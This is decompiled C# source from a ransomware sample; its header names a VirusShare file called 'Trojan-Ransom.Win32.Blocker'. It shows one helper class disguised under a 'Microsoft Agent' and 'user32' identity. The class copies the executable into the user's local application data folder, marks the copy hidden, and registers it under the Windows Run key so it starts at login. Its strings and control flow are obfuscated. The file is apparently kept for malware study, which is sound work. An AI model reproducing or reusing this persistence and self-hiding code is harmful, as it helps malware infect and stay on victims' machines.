// Decompiled with JetBrains decompiler
// Type: user32.Araclar
// Assembly: Microsoft Agent, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C1EE5016-57A9-47ED-B119-39E2E5AC9F12
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00028-msil\Trojan-Ransom.Win32.Blocker.aeqx-b1f983bddffbf954382415d75e15f1874e2eba7c8ad931f8ccdb2d4c798cea56.exe

using Microsoft.Win32;
using SmartAssembly.StringsEncoding;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace user32
{
  public class Araclar
  {
    private const string RegKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;
    private const int SET_FEATURE_ON_PROCESS = 2;
    public static string Regkeyname = Strings.Get(139);
    public static string DstName = Strings.Get(160);

    [DllImport("urlmon.dll")]
    [return: MarshalAs(UnmanagedType.Error)]
    private static extern int CoInternetSetFeatureEnabled(
      int FeatureEntry,
      [MarshalAs(UnmanagedType.U4)] int dwFlags,
      bool fEnable);

    public static void DisableClickSounds() => Araclar.CoInternetSetFeatureEnabled(21, 2, true);

    public static void Copy(string src, string dst)
    {
      if (true)
      {
        if (!\u0001.\u0001(dst))
          goto label_3;
      }
label_2:
      \u0002 obj1 = \u0002.\u0003;
      string str1 = dst;
      if (true)
        obj1(str1, FileAttributes.Normal);
label_3:
      try
      {
        if (true)
          \u0003.\u0004(src, dst, true);
      }
      catch (Exception ex)
      {
      }
      \u0002 obj2 = \u0002.\u0003;
      string str2 = dst;
      if (true)
        goto label_10;
label_8:
      if (true)
        return;
      goto label_2;
label_10:
      obj2(str2, FileAttributes.Hidden);
      goto label_8;
    }

    public static void Startup(string name, string path)
    {
      RegistryKey registryKey;
      do
      {
        registryKey = \u0004.\u007E\u0005((object) Registry.CurrentUser, Strings.Get(73), true);
      }
      while (false);
      if (registryKey == null)
        return;
      \u0005.\u007E\u0006((object) registryKey, name, (object) path);
      \u0006.\u007E\u0007((object) registryKey);
    }

    public static void DstCheck()
    {
      string src = \u0008.\u007E\u0016((object) \u0007.\u0015());
      string str = \u000E.\u001B(Environment.SpecialFolder.LocalApplicationData);
      if (\u0010.\u007F(\u000F.\u001C(src), str))
        return;
      Araclar.Copy(src, \u0011.\u0081(str, Strings.Get(134), Araclar.DstName));
    }
  }
}
